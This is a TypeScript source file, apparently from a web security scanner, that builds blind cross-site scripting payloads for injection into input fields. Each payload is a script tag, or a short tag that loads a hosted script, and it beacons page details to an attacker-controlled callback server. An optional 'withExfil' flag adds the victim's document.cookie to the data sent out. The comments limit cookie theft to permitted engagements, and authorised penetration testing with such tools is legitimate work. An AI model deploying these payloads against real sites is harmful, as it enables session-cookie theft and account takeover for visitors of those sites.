import { randomToken } from '../../utils/hash.js';

export interface BlindPayload {
  token: string;
  /** Injected into the target input field. */
  payload: string;
  /** Compact variant for length-limited fields. */
  shortPayload: string;
}

/**
 * Builds blind-XSS payloads that beacon back to your callback server.
 * Each payload carries a per-injection-point token so a hit can be tied
 * back to the exact scan + parameter that seeded it.
 *
 * Payloads only read non-sensitive page metadata by default; the exfil
 * set (cookies etc.) is gated behind `withExfil` — enable it only when
 * the engagement explicitly permits demonstrating impact.
 */
export class CallbackPayloadGenerator {
  constructor(private readonly callbackBase: string) {}

  generate(options: { withExfil?: boolean; tag?: string } = {}): BlindPayload {
    const token = randomToken(10);
    const base = this.callbackBase.replace(/\/$/, '');
    const collector = `${base}/c/${token}`;

    const fields = [
      `u:location.href`,
      `t:document.title`,
      `r:document.referrer`,
      `ua:navigator.userAgent`,
      ...(options.withExfil ? [`c:document.cookie`] : []),
    ].join(',');

    const beacon = `var d={${fields}};new Image().src="${collector}?d="+encodeURIComponent(JSON.stringify(d))`;
    const payload = `<script>${beacon}</script>`;
    const shortPayload = `"><script src="${base}/p/${token}.js"></script>`;

    return { token, payload, shortPayload };
  }

  /** Hosted collector script served at /p/:token.js for short injections. */
  hostedScript(token: string, withExfil = false): string {
    const base = this.callbackBase.replace(/\/$/, '');
    const fields = [
      `u:location.href`,
      `t:document.title`,
      `r:document.referrer`,
      `ua:navigator.userAgent`,
      ...(withExfil ? [`c:document.cookie`] : []),
    ].join(',');
    return `(function(){var d={${fields}};new Image().src="${base}/c/${token}?d="+encodeURIComponent(JSON.stringify(d));})();`;
  }
}
